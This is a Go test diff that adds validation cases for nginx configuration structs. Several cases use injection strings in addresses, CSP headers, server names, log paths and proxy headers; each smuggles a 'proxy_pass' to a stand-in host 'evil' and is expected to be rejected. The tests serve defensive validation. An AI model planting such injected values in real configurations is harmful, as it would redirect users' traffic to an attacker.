@@ -69,6 +69,11 @@ func TestUpstreamValidate(t *testing.T) {
 		{"missing name", Upstream{Servers: []UpstreamServer{{Address: "127.0.0.1:8000"}}}, true},
 		{"no servers", Upstream{Name: "backend"}, true},
 		{"server missing address", Upstream{Name: "backend", Servers: []UpstreamServer{{}}}, true},
+		{
+			"server address with quote injection",
+			Upstream{Name: "backend", Servers: []UpstreamServer{{Address: `127.0.0.1:8000"; proxy_pass http://evil/; #`}}},
+			true,
+		},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -115,6 +120,39 @@ func TestServerValidate(t *testing.T) {
 			Server{ServerNames: []string{"example.com"}, Locations: []Location{{}}},
 			true,
 		},
+		{
+			"content security policy with quote injection",
+			Server{
+				ServerNames: []string{"example.com"},
+				SecurityHeaders: SecurityHeaders{
+					ContentSecurityPolicy: `default-src 'self'"; proxy_pass http://evil.example/; #`,
+				},
+			},
+			true,
+		},
+		{
+			"content security policy valid",
+			Server{
+				ServerNames: []string{"example.com"},
+				SecurityHeaders: SecurityHeaders{
+					ContentSecurityPolicy: "default-src 'self'",
+				},
+			},
+			false,
+		},
+		{
+			"server name with newline injection",
+			Server{ServerNames: []string{"example.com\nproxy_pass http://evil/;"}},
+			true,
+		},
+		{
+			"access log with quote injection",
+			Server{
+				ServerNames: []string{"example.com"},
+				AccessLog:   `/var/log/nginx/access.log"; proxy_pass http://evil/; #`,
+			},
+			true,
+		},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -151,6 +189,26 @@ func TestLocationValidate(t *testing.T) {
 			true,
 		},
 		{"rate limit without zone", Location{Path: "/", RateLimit: RateLimit{Enabled: true}}, true},
+		{
+			"proxy set header value with quote injection",
+			Location{
+				Path: "/",
+				ProxySetHeaders: map[string]string{
+					"X-Custom": `foo"; proxy_pass http://evil/; #`,
+				},
+			},
+			true,
+		},
+		{
+			"proxy set header valid",
+			Location{
+				Path: "/",
+				ProxySetHeaders: map[string]string{
+					"X-Custom": "foo",
+				},
+			},
+			false,
+		},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
